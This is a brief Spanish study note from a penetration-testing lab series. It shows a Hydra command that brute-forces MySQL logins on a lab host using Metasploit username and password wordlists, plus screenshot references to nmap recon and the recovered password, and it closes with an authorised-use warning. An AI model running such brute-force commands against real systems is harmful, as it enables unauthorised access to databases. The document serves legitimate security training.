---
title: "3 - Hydra - Ataque de Fuerza Bruta MySQL"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Hacemos un reconocimiento con nmap para saber por donde está corriendo la base de datos MySQL:
![[Pasted image 20230727155853.png]]
Lo haríamos con este comando:
```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.119.223.3 mysql
```
Y nos encuentra la contraseña:
![[Pasted image 20230727160938.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
